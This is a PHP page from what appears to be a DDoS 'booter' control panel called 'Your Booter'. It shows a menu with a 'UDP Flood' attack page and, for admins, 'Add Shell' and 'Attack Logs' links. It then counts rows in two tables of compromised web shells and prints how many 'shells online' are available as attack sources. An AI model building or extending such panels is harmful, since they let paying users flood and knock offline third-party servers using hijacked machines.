<?php 
include 'dbc.php';
page_protect();
?>
<html>
<head>
<title>Your Booter</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="images/styles.css" rel="stylesheet" type="text/css">
</head>
<body>
<?php 
if (isset($_SESSION['user_id'])) {?>
<center>
<div class="header">
<image src="images/logo.png">
</div>
<br>
<div class="myaccount"><a href="index.php">Home</a> | <a href="hub.php">UDP Flood</a> | <a href="updates.php">Updates</a> | <a href="mysettings.php">Settings</a> | <?php } if (checkAdmin()) { ?> <a href="addshell.php">Add Shell</a> | <a href="logs.php">Attack Logs</a> | <a href="admin.php">Admin CP</a> | 
	  <?php } ?>
    <a href="logout.php">Logout</a>
</div>
<br>
<div class="myaccount">
<?php
$link = mysql_connect(DB_HOST, DB_USER, DB_PASS); 
mysql_select_db(DB_NAME, $link); 
$result = mysql_query("SELECT * FROM getshells", $link); 
$num_rows = mysql_num_rows($result); 
$result2 = mysql_query("SELECT * FROM postshells", $link); 
$num_rows2 = mysql_num_rows($result2); 

$shellsOnline = $num_rows + $num_rows2;

echo "There are currently <font color=\"lime\">" . $shellsOnline . "</font> shells online."; 
?>
</div>
<br>